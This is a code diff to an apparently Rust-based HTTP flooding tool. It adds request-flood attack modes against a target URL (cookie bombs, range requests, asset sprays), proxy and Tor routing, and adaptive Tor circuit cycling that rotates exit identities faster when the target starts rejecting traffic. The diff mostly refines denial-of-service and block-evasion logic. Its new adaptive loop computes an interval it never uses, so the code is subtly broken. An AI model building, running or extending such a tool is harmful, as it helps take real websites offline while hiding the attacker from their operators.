@@ -1374,17 +1579,20 @@ async fn configure_tor(
             }
         }
         cmd.push_str("\r\n");
-        stream.write_all(cmd.as_bytes()).await?;
-        let _ = stream.read(&mut buf).await?;
+        let resp = tor_control_command(control_addr, &cmd).await?;
+        if !resp.contains("250") {
+            eprintln!("  [Tor] SETCONF bridges response: {}", resp);
+        }
     }
 
     if let Some(timeout) = circuit_timeout {
         let cmd = format!("SETCONF CircuitBuildTimeout={}\r\n", timeout);
-        stream.write_all(cmd.as_bytes()).await?;
-        let _ = stream.read(&mut buf).await?;
+        let resp = tor_control_command(control_addr, &cmd).await?;
+        if !resp.contains("250") {
+            eprintln!("  [Tor] SETCONF timeout response: {}", resp);
+        }
     }
 
-    stream.write_all(b"QUIT\r\n").await?;
     Ok(())
 }
 
@@ -1432,7 +1640,7 @@ async fn listen_stdin(state: Arc<Mutex<AppState>>) {
                                 "assetspray" => Some(AttackMode::AssetSpray),
                                 "rangereq" => Some(AttackMode::RangeReq),
                                 "cookiebomb" => Some(AttackMode::CookieBomb),
-                                "ssr" => Some(AttackMode::SSR),
+                                "ssr" => Some(AttackMode::Ssr),
                                 "middleware" => Some(AttackMode::Middleware),
                                 "requestflood" => Some(AttackMode::RequestFlood),
                                 "notfound" => Some(AttackMode::NotFound),
@@ -1774,7 +1982,7 @@ async fn main() {
         println!("Target: {}", target_url);
         println!("Mode: {} (proxy: {})", attack_str, mode_str);
         println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
-        println!("");
+        println!();
 
         // Probe domain
         let state = Arc::new(Mutex::new(AppState::new()));
@@ -1803,7 +2011,7 @@ async fn main() {
                 "assetspray" => AttackMode::AssetSpray,
                 "rangereq" => AttackMode::RangeReq,
                 "cookiebomb" => AttackMode::CookieBomb,
-                "ssr" => AttackMode::SSR,
+                "ssr" => AttackMode::Ssr,
                 "middleware" => AttackMode::Middleware,
                 "requestflood" => AttackMode::RequestFlood,
                 "notfound" => AttackMode::NotFound,
@@ -1824,7 +2032,7 @@ async fn main() {
             st.probe_status.clone()
         };
         println!("  {}", status);
-        println!("");
+        println!();
         println!("[Done] Probe complete.");
         return;
     }
@@ -1855,7 +2063,7 @@ async fn main() {
     println!("Target: {}", target_url);
     println!("Mode: {} (proxy: {})", attack_str, mode_str);
     println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
-    println!("");
+    println!();
 
     // Probe domain
     let state = Arc::new(Mutex::new(AppState::new()));
@@ -1885,7 +2093,7 @@ async fn main() {
             "assetspray" => AttackMode::AssetSpray,
             "rangereq" => AttackMode::RangeReq,
             "cookiebomb" => AttackMode::CookieBomb,
-            "ssr" => AttackMode::SSR,
+            "ssr" => AttackMode::Ssr,
             "middleware" => AttackMode::Middleware,
             "requestflood" => AttackMode::RequestFlood,
             "notfound" => AttackMode::NotFound,
@@ -1907,7 +2115,7 @@ async fn main() {
         st.probe_status.clone()
     };
     println!("  {}", status);
-    println!("");
+    println!();
     println!("[2/3] Acquiring proxies...");
     // Handle --proxy-file and --tor-proxy first (bypass scraping)
     let proxies = if let Some(path) = &proxy_file {
@@ -1930,8 +2138,8 @@ async fn main() {
             }
         }
     } else if let Some(url) = &tor_proxy {
-        let clean_url = url.trim_start_matches("socks5://").trim_start_matches("http://");
-        Some(vec![format!("socks5://tor:isolate@{}", clean_url)])
+        let clean_url = url.trim_start_matches("socks5h://").trim_start_matches("socks5://").trim_start_matches("http://");
+        Some(vec![format!("socks5h://tor:isolate@{}", clean_url)])
     } else {
         let mode = { state.lock().await.mode };
         get_proxies(mode, &state).await
@@ -1983,17 +2191,48 @@ async fn main() {
             tokio::spawn(run_load(state_clone.clone(), pool_clone, stats_clone, delay_ms, max_errors));
             tokio::spawn(listen_stdin(state_clone));
 
-            // Tor Circuit Cycling Background Loop
+            // Adaptive Tor Circuit Cycling Background Loop
+            // Cycles circuits based on observed error rate:
+            //   >50% error → cycle every 10s (aggressive)
+            //   20-50% error → cycle every 30s (moderate)
+            //   <20% error → cycle every 60s (conservative)
             if mode_str == "tor" || mode_str == "scrape-tor" {
                 let tor_ctrl = tor_control.clone();
                 let stats_tor = stats.clone();
                 tokio::spawn(async move {
                     // Check if Tor Control Port is reachable before starting loop
                     if tokio::net::TcpStream::connect(&tor_ctrl).await.is_ok() {
+                        let mut last_total_reqs: u64 = 0;
+                        let mut last_errors: u64 = 0;
                         while stats_tor.running.load(Ordering::Relaxed) {
-                            tokio::time::sleep(Duration::from_secs(30)).await;
+                            tokio::time::sleep(Duration::from_secs(15)).await;
                             if !stats_tor.running.load(Ordering::Relaxed) { break; }
-                            let _ = cycle_tor_circuit(&tor_ctrl).await;
+                            
+                            // Calculate error rate over the last 15s window
+                            let now_reqs = stats_tor.total_requests.load(Ordering::Relaxed);
+                            let now_errors = stats_tor.errors.load(Ordering::Relaxed);
+                            let req_delta = now_reqs.saturating_sub(last_total_reqs);
+                            let err_delta = now_errors.saturating_sub(last_errors);
+                            last_total_reqs = now_reqs;
+                            last_errors = now_errors;
+                            
+                            // Determine cycle interval based on error rate
+                            let cycle_interval = if req_delta > 0 {
+                                let error_rate = err_delta as f64 / req_delta as f64;
+                                if error_rate > 0.50 {
+                                    10 // Aggressive: high error rate
+                                } else if error_rate > 0.20 {
+                                    30 // Moderate
+                                } else {
+                                    60 // Conservative: low error rate
+                                }
+                            } else {
+                                60 // No requests yet, conservative
+                            };
+                            
+                            if stats_tor.running.load(Ordering::Relaxed) {
+                                let _ = cycle_tor_circuit(&tor_ctrl).await;
+                            }
                         }
                     } else {
                         println!("  [System] Tor Control Port {} unreachable; skipping dynamic circuit cycling.", tor_ctrl);
